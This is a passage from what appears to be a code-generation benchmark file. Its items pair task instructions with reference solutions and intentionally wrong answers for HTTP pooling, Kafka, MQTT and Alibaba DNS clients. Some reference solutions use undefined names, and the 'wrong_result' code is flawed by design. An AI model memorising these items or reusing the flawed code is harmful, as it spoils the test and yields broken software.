    "Task_id": 26,
    "Instruction": "Task Description: Implement an HTTP connection pool class that manages HTTP connections to a specified host, handling connection creation, request execution, and response processing with support for retries, timeouts, and redirects.\n\nClass Description: HTTPConnectionPool is a connection pool manager for HTTP connections that provides efficient reuse of connections to a specified host. It handles connection lifecycle, request execution, error handling, and retries.\n\nAttributes:\n- scheme: str - The URL scheme (default \"http\")\n- host: str - The normalized hostname for connections\n- port: int - The port number for connections\n- timeout: Timeout - Connection and read timeout configuration\n- retries: Retry - Retry configuration for failed requests\n- proxy: str - Proxy server URL if configured\n- proxy_headers: dict - Headers for proxy connections\n- conn_kw: dict - Additional connection parameters\n\nMethods:\n- __init__(host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw) -> None\n  - Initializes the connection pool with target host and configuration\n  - Input: \n    - host: str - Target hostname\n    - port: int - Target port (optional)\n    - timeout: Timeout - Timeout configuration\n    - retries: Retry - Retry configuration\n    - _proxy: str - Proxy URL (optional)\n    - _proxy_headers: dict - Proxy headers (optional)\n    - conn_kw: dict - Additional connection parameters\n\n- _new_conn() -> HTTPConnection\n  - Creates a new HTTP connection\n  - Output: HTTPConnection - A new connection instance\n\n- _make_request(conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw) -> HTTPResponse\n  - Executes an HTTP request through the given connection\n  - Input:\n    - conn: HTTPConnection - Connection to use\n    - method: str - HTTP method (GET, POST, etc.)\n    - url: str - Target URL\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Whether to use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response\n\n- urlopen(method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw) -> HTTPResponse\n  - Main method to execute HTTP requests with connection pooling\n  - Input:\n    - method: str - HTTP method\n    - url: str - Target URL\n    - body: str - Request body (optional)\n    - headers: dict - Request headers (optional)\n    - retries: Retry - Retry configuration (optional)\n    - redirect: bool - Whether to follow redirects\n    - timeout: Timeout - Request timeout\n    - chunked: bool - Use chunked transfer encoding\n  - Output: HTTPResponse - The HTTP response",
    "Canonical_solution": "import socket\nfrom socket import error as SocketError\nfrom socket import timeout as SocketTimeout\nfrom .connection import HTTPConnection, HTTPSConnection\nfrom .exceptions import (\n    EmptyPoolError,\n    HostChangedError,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    SSLError,\n    TimeoutError,\n)\nfrom .util.connection import is_connection_dropped\nfrom .util.proxy import connection_requires_http_tunnel\nfrom .util.retry import Retry\nfrom .util.timeout import Timeout\nfrom .util.url import Url, _encode_target\nfrom .util.url import _normalize_host as normalize_host\nfrom .util.url import get_host, parse_url\n\nclass HTTPConnectionPool:\n    scheme = \"http\"\n    ConnectionCls = HTTPConnection\n\n    def __init__(\n        self,\n        host,\n        port=None,\n        strict=False,\n        timeout=Timeout.DEFAULT_TIMEOUT,\n        maxsize=1,\n        block=False,\n        headers=None,\n        retries=None,\n        _proxy=None,\n        _proxy_headers=None,\n        **conn_kw\n    ):\n        self.host = _normalize_host(host, scheme=self.scheme)\n        self._proxy_host = host.lower()\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers or {}\n        self.conn_kw = conn_kw\n\n    def _new_conn(self):\n        return self.ConnectionCls(\n            host=self.host,\n            port=self.port,\n            timeout=self.timeout.connect_timeout,\n            strict=self.strict,\n            **self.conn_kw\n        )\n\n    def _make_request(\n        self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw\n    ):\n        try:\n            if chunked:\n                conn.request_chunked(method, url, **httplib_request_kw)\n            else:\n                conn.request(method, url, **httplib_request_kw)\n        except (SocketTimeout, BaseSSLError) as e:\n            raise\n\n        read_timeout = timeout_obj.read_timeout\n        if getattr(conn, \"sock\", None):\n            if read_timeout == 0:\n                raise ReadTimeoutError(\n                    self, url, \"Read timed out. (read timeout=%s)\" % read_timeout\n                )\n            conn.sock.settimeout(read_timeout)\n\n        try:\n            httplib_response = conn.getresponse()\n        except (SocketTimeout, BaseSSLError, SocketError) as e:\n            raise\n\n        return httplib_response\n\n    def urlopen(\n        self,\n        method,\n        url,\n        body=None,\n        headers=None,\n        retries=None,\n        redirect=True,\n        assert_same_host=True,\n        timeout=_Default,\n        pool_timeout=None,\n        release_conn=None,\n        chunked=False,\n        **response_kw\n    ):\n        parsed_url = parse_url(url)\n        destination_scheme = parsed_url.scheme\n\n        if not isinstance(retries, Retry):\n            retries = Retry.from_int(retries, redirect=redirect, default=self.retries)\n\n        if assert_same_host and not self.is_same_host(url):\n            raise HostChangedError(self, url, retries)\n\n        conn = None\n        release_this_conn = release_conn\n        http_tunnel_required = connection_requires_http_tunnel(\n            self.proxy, self.proxy_config, destination_scheme\n        )\n\n        try:\n            timeout_obj = self._get_timeout(timeout)\n            conn = self._get_conn(timeout=pool_timeout)\n            conn.timeout = timeout_obj.connect_timeout\n\n            if http_tunnel_required:\n                self._prepare_proxy(conn)\n\n            httplib_response = self._make_request(\n                conn,\n                method,\n                url,\n                timeout=timeout_obj,\n                body=body,\n                headers=headers,\n                chunked=chunked,\n            )\n\n            response = self.ResponseCls.from_httplib(\n                httplib_response,\n                pool=self,\n                connection=response_conn,\n                retries=retries,\n                **response_kw\n            )\n\n        except (\n            TimeoutError,\n            HTTPException,\n            SocketError,\n            ProtocolError,\n            BaseSSLError,\n            SSLError,\n            CertificateError,\n        ) as e:\n            retries = retries.increment(\n                method, url, error=e, _pool=self, _stacktrace=sys.exc_info()[2]\n            )\n            retries.sleep()\n            conn = conn and conn.close()\n\n        finally:\n            if release_this_conn:\n                self._put_conn(conn)\n\n        if not conn:\n            return self.urlopen(\n                method,\n                url,\n                body,\n                headers,\n                retries,\n                redirect,\n                assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        redirect_location = redirect and response.get_redirect_location()\n        if redirect_location:\n            response.drain_conn()\n            retries.sleep_for_retry(response)\n            return self.urlopen(\n                method,\n                redirect_location,\n                body,\n                headers,\n                retries=retries,\n                redirect=redirect,\n                assert_same_host=assert_same_host,\n                timeout=timeout,\n                pool_timeout=pool_timeout,\n                release_conn=release_conn,\n                chunked=chunked,\n                **response_kw\n            )\n\n        return response",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "class HTTPConnectionPool:\n    def __init__(self, host, port=None, strict=False, timeout=Timeout.DEFAULT_TIMEOUT, maxsize=1, block=False, headers=None, retries=None, _proxy=None, _proxy_headers=None, **conn_kw):\n        self.scheme = \"http\"\n        self.host = host\n        self.port = port\n        self.timeout = timeout\n        self.retries = retries\n        self.proxy = _proxy\n        self.proxy_headers = _proxy_headers\n        self.conn_kw = conn_kw\n        self.maxsize = maxsize\n        self.block = block\n        self.strict = strict\n        self.headers = headers or {}\n\n    def _new_conn(self):\n        from urllib3.connection import HTTPConnection\n        return HTTPConnection(self.host, self.port, **self.conn_kw)\n\n    def _make_request(self, conn, method, url, timeout=_Default, chunked=False, **httplib_request_kw):\n        from urllib3.response import HTTPResponse\n        return HTTPResponse(conn.request(method, url, timeout=timeout, chunked=chunked, **httplib_request_kw))\n\n    def urlopen(self, method, url, body=None, headers=None, retries=None, redirect=True, assert_same_host=True, timeout=_Default, pool_timeout=None, release_conn=None, chunked=False, **response_kw):\n        from urllib3.util.retry import Retry\n        from urllib3.util.url import parse_url\n        from urllib3.util.timeout import Timeout\n        from urllib3.exceptions import HTTPError, TimeoutError, ConnectionError, MaxRetryError\n\n        if retries is None:\n            retries = Retry(total=self.retries.total, connect=self.retries.connect, read=self.retries.read, redirect=self.retries.redirect, status=self.retries.status)\n        \n        parsed_url = parse_url(url)\n        if parsed_url.scheme != self.scheme or parsed_url.host != self.host or (self.port and parsed_url.port != self.port):\n            raise ValueError(\"URL does not match the connection pool's scheme, host, or port\")\n\n        if not self.block and self.maxsize <= 0:\n            raise ValueError(\"Connection pool is empty and blocking is disabled\")\n\n        conn = self._new_conn()\n        for i in range(retries.total + 1):\n            try:\n                if self.proxy:\n                    conn.set_proxy(self.proxy, self.proxy_headers)\n                if headers:\n                    conn.request_headers(headers)\n                response = self._make_request(conn, method, url, timeout=timeout, chunked=chunked, **response_kw)\n                if redirect and response.status in (301, 302, 303, 307, 308):\n                    location = response.headers.get('Location')\n                    if not location:\n                        raise HTTPError(\"No Location header in redirect response\")\n                    new_url = location\n                    if assert_same_host and parse_url(new_url).host != self.host:\n                        raise ValueError(\"Redirect to different host\")\n                    return self.urlopen(method, new_url, body=body, headers=headers, retries=retries, redirect=redirect, assert_same_host=assert_same_host, timeout=timeout, pool_timeout=pool_timeout, release_conn=release_conn, chunked=chunked, **response_kw)\n                return response\n            except (HTTPError, TimeoutError, ConnectionError) as e:\n                if i == retries.total:\n                    raise MaxRetryError(\"All retries failed\", cause=e)\n                continue\n        return response"
  },
  {
    "Task_id": 261,
    "Instruction": "Task Description: Implement a Kafka producer function that reads data from a CSV file and sends it as JSON messages to a specified Kafka topic, with special commit markers before and after the data transmission.\n\nFunction Description: The function establishes a connection to a Kafka broker, reads movie rating data from a CSV file, converts each record to JSON format, and sends them to a predefined Kafka topic. It sends a \"*COMMIT*\" marker before and after the data transmission to indicate the start and end of the dataset. The function includes delays to ensure proper message delivery and resource cleanup.\n\nInput: None (The function uses hardcoded values for the Kafka broker configuration and file path)\n\nOutput: None (The function's effect is the messages sent to the Kafka topic)",
    "Canonical_solution": "import csv\nimport json\nimport time\nfrom kafka import KafkaProducer\n\ndef kafka_producer():\n    topic = \"ratings\"\n    time.sleep(30)\n    producer = KafkaProducer(\n        bootstrap_servers=[\"redpanda:9092\"],\n        security_protocol=\"PLAINTEXT\",\n        api_version=(0, 10, 2),\n    )\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n\n    with open(\"./dataset.csv\", newline=\"\") as csvfile:\n        dataset_reader = csv.reader(csvfile, delimiter=\",\")\n        first_line = True\n        for row in dataset_reader:\n            if first_line:\n                first_line = False\n                continue\n            message_json = {\n                \"userId\": int(row[0]),\n                \"movieId\": int(row[1]),\n                \"rating\": float(row[2]),\n                \"timestamp\": int(row[3]),\n            }\n            producer.send(topic, (json.dumps(message_json)).encode(\"utf-8\"))\n            time.sleep(0.1)\n\n    producer.send(topic, \"*COMMIT*\".encode(\"utf-8\"))\n    time.sleep(2)\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "from kafka import KafkaProducer\nimport json\nimport csv\nimport time\nfrom confluent_kafka import Producer\n\ndef send_movie_ratings_to_kafka():\n    # Kafka configuration\n    broker_address = 'localhost:9092'\n    topic_name = 'movie_ratings'\n\n    # CSV file path\n    csv_file_path = 'movie_ratings.csv'\n\n    # Create Kafka producer\n    producer = Producer({'bootstrap.servers': broker_address})\n\n    # Send COMMIT marker before data\n    producer.produce(topic_name, value=json.dumps({\"type\": \"COMMIT\"}))\n    producer.flush()\n\n    # Read CSV and send as JSON messages\n    with open(csv_file_path, 'r') as csvfile:\n        csv_reader = csv.DictReader(csvfile)\n        for row in csv_reader:\n            # Convert row to JSON\n            json_message = json.dumps(row)\n            producer.produce(topic_name, value=json_message)\n            producer.flush()\n            time.sleep(0.1)  # Delay between messages\n\n    # Send COMMIT marker after data\n    producer.produce(topic_name, value=json.dumps({\"type\": \"COMMIT\"}))\n    producer.flush()\n\n# Call the function\nsend_movie_ratings_to_kafka()"
  },
  {
    "Task_id": 263,
    "Instruction": "Task Description: Write a Python function that tests end-to-end message production to a Kafka topic with configurable compression, verifying successful message delivery.\n\nFunction Description: This function creates a Kafka producer, sends a batch of test messages to a specified topic with the given compression type, verifies all messages were successfully delivered, and properly cleans up resources. It includes version compatibility checks for specific compression types (LZ4 and Zstd).\n\nInput:\n- kafka_broker: [object] - An object containing host and port information for the Kafka broker (must have .host and .port attributes)\n- compression: [str] - The compression type to use for message production (e.g., 'none', 'gzip', 'snappy', 'lz4', 'zstd')\n\nOutput:\n- None (asserts message count matches expected value, raises exceptions on failure)\n\nNote: The function uses pytest.skip() for unsupported compression/version combinations and asserts the successful delivery of all messages.",
    "Canonical_solution": "import pytest\nfrom kafka import KafkaProducer\nfrom test.testutil import env_kafka_version, random_string\n\ndef test_end_to_end(kafka_broker, compression):\n    if compression == 'lz4':\n        if env_kafka_version() < (0, 8, 2):\n            pytest.skip('LZ4 requires 0.8.2')\n        elif platform.python_implementation() == 'PyPy':\n            pytest.skip('python-lz4 crashes on older versions of pypy')\n\n    if compression == 'zstd' and env_kafka_version() < (2, 1, 0):\n        pytest.skip('zstd requires kafka 2.1.0 or newer')\n\n    connect_str = ':'.join([kafka_broker.host, str(kafka_broker.port)])\n    producer = KafkaProducer(bootstrap_servers=connect_str,\n                             retries=5,\n                             max_block_ms=30000,\n                             compression_type=compression,\n                             value_serializer=str.encode)\n\n    topic = random_string(5)\n\n    messages = 100\n    futures = []\n    for i in range(messages):\n        futures.append(producer.send(topic, 'msg %d' % i))\n    ret = [f.get(timeout=30) for f in futures]\n    assert len(ret) == messages\n    producer.close()",
    "Code_level": "Function-level",
    "FSMID_for_test": 78,
    "wrong_result": "import pytest\nfrom kafka import KafkaProducer\nfrom kafka.errors import KafkaError\n\ndef test_kafka_message_delivery(kafka_broker, compression):\n    # Check version compatibility for compression types\n    if compression == 'lz4':\n        pytest.skip(\"LZ4 compression is not supported in this Kafka version\")\n    elif compression == 'zstd':\n        pytest.skip(\"Zstd compression is not supported in this Kafka version\")\n    \n    # Create Kafka producer with specified compression\n    producer = KafkaProducer(\n        bootstrap_servers=f\"{kafka_broker.host}:{kafka_broker.port}\",\n        compression_type=compression\n    )\n    \n    # Define test messages\n    test_messages = [\n        b\"Test message 1\",\n        b\"Test message 2\",\n        b\"Test message 3\"\n    ]\n    \n    # Send messages to the topic\n    topic_name = \"test_topic\"\n    for message in test_messages:\n        producer.send(topic_name, value=message)\n    \n    # Wait for all messages to be delivered and check for errors\n    try:\n        producer.flush()\n    except KafkaError as e:\n        pytest.fail(f\"Kafka error occurred: {e}\")\n    \n    # Verify all messages were delivered\n    assert len(test_messages) == 3, \"Expected 3 test messages but received fewer\""
  },
  {
    "Task_id": 267,
    "Instruction": "Task Description: Create a Python class that implements an MQTT subscriber client using the Paho MQTT library, capable of connecting to an MQTT broker, subscribing to topics, and handling incoming messages with configurable authentication and TLS options.\n\nClass Description: The MQTTSubscriber class provides a configurable MQTT client implementation for subscribing to topics and processing messages from an MQTT broker. It supports various connection options including TLS encryption and authentication.\n\nAttributes:\n- host: str - The MQTT broker host address (default: \"mqtt.eclipseprojects.io\")\n- topic: str - The topic to subscribe to (default: \"$SYS/#\")\n- qos: int - Quality of Service level for the subscription (default: 0)\n- clientid: str - Client identifier for the MQTT connection (default: None)\n- username: str - Username for broker authentication (default: None)\n- password: str - Password for broker authentication (default: None)\n- port: int - Broker connection port (default: None, auto-detected)\n- keepalive: int - Connection keepalive period in seconds (default: 60)\n- use_tls: bool - Flag to enable TLS encryption (default: False)\n- insecure: bool - Flag to disable certificate verification (default: False)\n- cacerts: str - Path to CA certificate file (default: None)\n- tls_version: str - TLS protocol version (default: None)\n- debug: bool - Flag to enable debug logging (default: False)\n- disable_clean_session: bool - Flag to disable clean session (default: False)\n- mqttc: mqtt.Client - The Paho MQTT client instance\n\nMethods:\n- __init__(host, topic, qos, clientid, username, password, port, keepalive, use_tls, insecure, cacerts, tls_version, debug, disable_clean_session) -> None - Initializes the MQTT subscriber with configuration parameters\n- _setup_callbacks() -> None - Sets up the MQTT client callback functions\n- _configure_tls() -> None - Configures TLS settings for secure connections\n- _configure_authentication() -> None - Configures username/password authentication\n- on_connect(mqttc, obj, flags, reason_code, properties) -> None - Callback for connection events\n- on_message(mqttc, obj, msg) -> None - Callback for incoming messages\n- on_publish(mqttc, obj, mid) -> None - Callback for publish events\n- on_subscribe(mqttc, obj, mid, reason_code_list, properties) -> None - Callback for subscription events\n- on_log(mqttc, obj, level, string) -> None - Callback for debug logging\n- connect_and_subscribe() -> None - Connects to the broker and starts the message loop",
    "Canonical_solution": "import argparse\nimport ssl\nimport paho.mqtt.client as mqtt\n\nclass MQTTSubscriber:\n    def __init__(self, host=\"mqtt.eclipseprojects.io\", topic=\"$SYS/#\", qos=0, clientid=None,\n                 username=None, password=None, port=None, keepalive=60, use_tls=False,\n                 insecure=False, cacerts=None, tls_version=None, debug=False,\n                 disable_clean_session=False):\n        self.host = host\n        self.topic = topic\n        self.qos = qos\n        self.clientid = clientid\n        self.username = username\n        self.password = password\n        self.port = port\n        self.keepalive = keepalive\n        self.use_tls = use_tls\n        self.insecure = insecure\n        self.cacerts = cacerts\n        self.tls_version = tls_version\n        self.debug = debug\n        self.disable_clean_session = disable_clean_session\n\n        self.mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, self.clientid,\n                                clean_session=not self.disable_clean_session)\n\n        self._setup_callbacks()\n        self._configure_tls()\n        self._configure_authentication()\n\n    def _setup_callbacks(self):\n        self.mqttc.on_message = self.on_message\n        self.mqttc.on_connect = self.on_connect\n        self.mqttc.on_publish = self.on_publish\n        self.mqttc.on_subscribe = self.on_subscribe\n        if self.debug:\n            self.mqttc.on_log = self.on_log\n\n    def _configure_tls(self):\n        if self.use_tls or self.cacerts:\n            if self.tls_version == \"tlsv1.2\":\n                tlsVersion = ssl.PROTOCOL_TLSv1_2\n            elif self.tls_version == \"tlsv1.1\":\n                tlsVersion = ssl.PROTOCOL_TLSv1_1\n            elif self.tls_version == \"tlsv1\":\n                tlsVersion = ssl.PROTOCOL_TLSv1\n            else:\n                tlsVersion = None\n\n            cert_required = ssl.CERT_NONE if self.insecure else ssl.CERT_REQUIRED\n            self.mqttc.tls_set(ca_certs=self.cacerts, certfile=None, keyfile=None,\n                              cert_reqs=cert_required, tls_version=tlsVersion)\n            if self.insecure:\n                self.mqttc.tls_insecure_set(True)\n\n    def _configure_authentication(self):\n        if self.username or self.password:\n            self.mqttc.username_pw_set(self.username, self.password)\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        print(\"reason_code: \" + str(reason_code))\n\n    def on_message(self, mqttc, obj, msg):\n        print(msg.topic + \" \" + str(msg.qos) + \" \" + str(msg.payload))\n\n    def on_publish(self, mqttc, obj, mid):\n        print(\"mid: \" + str(mid))\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(\"Subscribed: \" + str(mid) + \" \" + str(reason_code_list))\n\n    def on_log(self, mqttc, obj, level, string):\n        print(string)\n\n    def connect_and_subscribe(self):\n        if self.port is None:\n            self.port = 8883 if (self.use_tls or self.cacerts) else 1883\n\n        print(f\"Connecting to {self.host} port: {self.port}\")\n        self.mqttc.connect(self.host, self.port, self.keepalive)\n        self.mqttc.subscribe(self.topic, self.qos)\n        self.mqttc.loop_forever()",
    "Code_level": "Class-level",
    "FSMID_for_test": 84,
    "wrong_result": "class MQTTSubscriber:\n    def __init__(self, host=\"mqtt.eclipseprojects.io\", topic=\"$SYS/#\", qos=0, clientid=None, username=None, password=None, port=None, keepalive=60, use_tls=False, insecure=False, cacerts=None, tls_version=None, debug=False, disable_clean_session=False):\n        self.host = host\n        self.topic = topic\n        self.qos = qos\n        self.clientid = clientid\n        self.username = username\n        self.password = password\n        self.port = port\n        self.keepalive = keepalive\n        self.use_tls = use_tls\n        self.insecure = insecure\n        self.cacerts = cacerts\n        self.tls_version = tls_version\n        self.debug = debug\n        self.disable_clean_session = disable_clean_session\n        self.mqttc = mqtt.Client(clientid=clientid, clean_session=not disable_clean_session)\n        self._setup_callbacks()\n        self._configure_tls()\n        self._configure_authentication()\n\n    def _setup_callbacks(self):\n        self.mqttc.on_connect = self.on_connect\n        self.mqttc.on_message = self.on_message\n        self.mqttc.on_publish = self.on_publish\n        self.mqttc.on_subscribe = self.on_subscribe\n        self.mqttc.on_log = self.on_log\n\n    def _configure_tls(self):\n        if self.use_tls:\n            if self.cacerts:\n                self.mqttc.tls_set(ca_certs=self.cacerts, certfile=None, keyfile=None, cert_reqs=ssl.CERT_REQUIRED if not self.insecure else ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLSv1_2 if self.tls_version == \"TLSv1_2\" else ssl.PROTOCOL_TLSv1_1 if self.tls_version == \"TLSv1_1\" else ssl.PROTOCOL_TLSv1)\n            else:\n                self.mqttc.tls_set(cert_reqs=ssl.CERT_REQUIRED if not self.insecure else ssl.CERT_NONE, tls_version=ssl.PROTOCOL_TLSv1_2 if self.tls_version == \"TLSv1_2\" else ssl.PROTOCOL_TLSv1_1 if self.tls_version == \"TLSv1_1\" else ssl.PROTOCOL_TLSv1)\n\n    def _configure_authentication(self):\n        if self.username and self.password:\n            self.mqttc.username_pw_set(self.username, self.password)\n\n    def on_connect(self, mqttc, obj, flags, reason_code, properties):\n        if reason_code == 0:\n            mqttc.subscribe(self.topic, qos=self.qos)\n\n    def on_message(self, mqttc, obj, msg):\n        print(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    def on_publish(self, mqttc, obj, mid):\n        print(f\"Message published with mid: {mid}\")\n\n    def on_subscribe(self, mqttc, obj, mid, reason_code_list, properties):\n        print(f\"Subscription with mid: {mid} result: {reason_code_list}\")\n\n    def on_log(self, mqttc, obj, level, string):\n        if level == 4:\n            print(f\"LOG: {string}\")\n\n    def connect_and_subscribe(self):\n        if self.port is None:\n            self.port = 8883 if self.use_tls else 1883\n        self.mqttc.connect(self.host, self.port, self.keepalive)\n        self.mqttc.loop_start()\n        self.mqttc.subscribe(self.topic, qos=self.qos)"
  },
  {
    "Task_id": 269,
    "Instruction": "Task Description: Implement an MQTT subscriber function in Python that connects to a broker, subscribes to a topic, and processes incoming messages using the Paho MQTT client library.\n\nFunction Description: The function `mqtt_subscriber` establishes a connection to an MQTT broker over WebSockets, subscribes to a specified topic, and continuously listens for incoming messages. It utilizes callback functions to handle connection events, incoming messages, and subscription acknowledgments.\n\nInput: None (The broker address, port, and topic are hardcoded in the function for simplicity.)\n\nOutput: None (The function prints connection status, subscription acknowledgments, and received messages to the console.)\n\n---\n\nTask Description: Implement an MQTT subscriber class in Python that encapsulates the functionality of connecting to a broker, subscribing to topics, and processing incoming messages using the Paho MQTT client library.\n\nClass Description: The `MQTTSubscriber` class provides a reusable and configurable way to subscribe to MQTT topics. It initializes with broker details and topic configurations, and it uses callback methods to handle MQTT events such as connection, message reception, and subscription.\n\nAttributes:\n\n- `client`: [mqtt.Client] - The Paho MQTT client instance used for communication.\n- `broker_address`: [str] - The address of the MQTT broker.\n- `broker_port`: [int] - The port number of the MQTT broker.\n- `topic`: [str] - The MQTT topic to subscribe to.\n- `qos`: [int] - The Quality of Service level for the subscription.\n\nMethods:\n\n- `__init__(broker_address: str, broker_port: int, topic: str, qos: int = 0) -> None` - Initializes the MQTT subscriber with broker details and topic configuration.\n- `on_connect(client: mqtt.Client, obj: Any, flags: dict, reason_code: int, properties: Any) -> None` - Callback for when the client connects to the broker.\n- `on_message(client: mqtt.Client, obj: Any, msg: mqtt.MQTTMessage) -> None` - Callback for when a message is received on the subscribed topic.\n- `on_subscribe(client: mqtt.Client, obj: Any, mid: int, reason_code_list: list, properties: Any) -> None` - Callback for when the client subscribes to a topic.\n- `start() -> None` - Connects to the broker, subscribes to the topic, and starts the MQTT loop to process messages.\n- `stop() -> None` - Stops the MQTT loop and disconnects from the broker.",
    "Canonical_solution": "import paho.mqtt.client as mqtt\n\ndef on_connect(mqttc, obj, flags, reason_code, properties):\n    print(\"reason_code: \"+str(reason_code))\n\ndef on_message(mqttc, obj, msg):\n    print(msg.topic+\" \"+str(msg.qos)+\" \"+str(msg.payload))\n\ndef on_subscribe(mqttc, obj, mid, reason_code_list, properties):\n    print(\"Subscribed: \"+str(mid)+\" \"+str(reason_code_list))\n\ndef on_log(mqttc, obj, level, string):\n    print(string)\n\ndef mqtt_subscriber():\n    mqttc = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, transport=\"websockets\")\n    mqttc.on_message = on_message\n    mqttc.on_connect = on_connect\n    mqttc.on_subscribe = on_subscribe\n    mqttc.connect(\"mqtt.eclipseprojects.io\", 80, 60)\n    mqttc.subscribe(\"$SYS/broker/version\", 0)\n    mqttc.loop_forever()",
    "Code_level": "Function-level",
    "FSMID_for_test": 84,
    "wrong_result": "class MQTTSubscriber:\n    def __init__(self, broker_address: str, broker_port: int, topic: str, qos: int = 0):\n        import paho.mqtt.client as mqtt\n        self.client = mqtt.Client()\n        self.broker_address = broker_address\n        self.broker_port = broker_port\n        self.topic = topic\n        self.qos = qos\n        self.client.on_connect = self.on_connect\n        self.client.on_message = self.on_message\n        self.client.on_subscribe = self.on_subscribe\n\n    def on_connect(self, client, obj, flags, reason_code, properties):\n        print(f\"Connected to broker with reason code {reason_code}\")\n        client.subscribe(self.topic, qos=self.qos)\n\n    def on_message(self, client, obj, msg):\n        print(f\"Received message: {msg.payload.decode()} on topic {msg.topic}\")\n\n    def on_subscribe(self, client, obj, mid, reason_code_list, properties):\n        print(f\"Subscribed with mid {mid} and reason codes {reason_code_list}\")\n\n    def start(self):\n        self.client.connect(self.broker_address, self.broker_port)\n        self.client.loop_start()\n\n    def stop(self):\n        self.client.loop_stop()\n        self.client.disconnect()"
  },
  {
    "Task_id": 27,
    "Instruction": "Task Description: Create a Python class that implements an HTTP client for interacting with the Alibaba Cloud DNS API, handling request signing, connection management, and response processing.\n\nClass Description: The API class provides methods to send authenticated requests to Alibaba Cloud's DNS API. It handles parameter signing, HTTP connection management (with optional proxy support), and response processing.\n\nAttributes:\n\nID: [str] - API access key ID stored in Config class\nTOKEN: [str] - API access token stored in Config class\nPROXY: [str/None] - Optional proxy server address stored in Config class\nTTL: [int/None] - Optional time-to-live value stored in Config class\nSITE: [str] - API endpoint domain (constant in API class)\nMETHOD: [str] - Default HTTP method (constant in API class)\n\nMethods:\n\nrequest: [request](param=None, **params) -> [dict] - Main method to send API requests. Takes optional dictionary or keyword parameters, signs them, sends HTTP request, and returns parsed response. Raises exception on error.\nsignature: [signature](params) -> [dict] - Internal method to sign request parameters (implementation not shown in reference code)\n__init__: [__init__]() -> [None] - Constructor for Config class to initialize credentials and settings\ngetresponse: [getresponse]() -> [HTTPResponse] - Internal method to get HTTP response (called through connection object)\nclose: [close]() -> [None] - Internal method to close HTTP connection (called through connection object)",
    "Canonical_solution": "from hashlib import sha1\nfrom hmac import new as hmac\nfrom uuid import uuid4\nfrom base64 import b64encode\nfrom json import loads as jsondecode\nfrom logging import debug, info, warning\nfrom datetime import datetime\nfrom http.client import HTTPSConnection\nfrom urllib.parse import urlencode, quote_plus, quote\n\nclass Config:\n    ID = \"id\"\n    TOKEN = \"TOKEN\"\n    PROXY = None\n    TTL = None\n\nclass API:\n    SITE = \"alidns.aliyuncs.com\"\n    METHOD = \"POST\"\n\ndef request(param=None, **params):\n    if param:\n        params.update(param)\n    params = dict((k, params[k]) for k in params if params[k] is not None)\n    params = signature(params)\n    info(\"%s: %s\", API.SITE, params)\n\n    if Config.PROXY:\n        conn = HTTPSConnection(Config.PROXY)\n        conn.set_tunnel(API.SITE, 443)\n    else:\n        conn = HTTPSConnection(API.SITE)\n    conn.request(API.METHOD, '/', urlencode(params),\n                 {\"Content-type\": \"application/x-www-form-urlencoded\"})\n    response = conn.getresponse()\n    data = response.read().decode('utf8')\n    conn.close()\n\n    if response.status < 200 or response.status >= 300:\n        warning('%s : error[%d]: %s', params['Action'], response.status, data)\n        raise Exception(data)\n    else:\n        data = jsondecode(data)\n        debug('%s : result:%s', params['Action'], data)\n        return data",
    "Code_level": "Function-level",
    "FSMID_for_test": 56,
    "wrong_result": "import requests\nfrom urllib.parse import urlencode\n\nclass AlibabaDNSClient:\n    SITE = \"https://alidns.aliyuncs.com\"\n    METHOD = \"POST\"\n\n    def __init__(self, access_id, access_token, proxy=None, ttl=None):\n        self.ID = access_id\n        self.TOKEN = access_token\n        self.PROXY = proxy\n        self.TTL = ttl\n\n    def request(self, param=None, **params):\n        if param is not None:\n            params = {**param, **params}\n        signed_params = self.signature(params)\n        headers = {\n            \"Authorization\": f\"ALIYUN {self.ID}:{self.TOKEN}\",\n            \"Content-Type\": \"application/x-www-form-urlencoded\"\n        }\n        url = f\"{self.SITE}?{urlencode(signed_params)}\"\n        proxies = {} if self.PROXY is None else {\"http\": self.PROXY, \"https\": self.PROXY}\n        response = requests.post(url, headers=headers, proxies=proxies, timeout=self.TTL)\n        response.raise_for_status()\n        return response.json()\n\n    def signature(self, params):\n        sorted_params = sorted(params.items())\n        string_to_sign = \"&\".join([f\"{k}={v}\" for k, v in sorted_params])\n        return {\"Signature\": string_to_sign}\n\n    def getresponse(self):\n        pass\n\n    def close(self):\n        pass"
  },
  {
    "Task_id": 270,
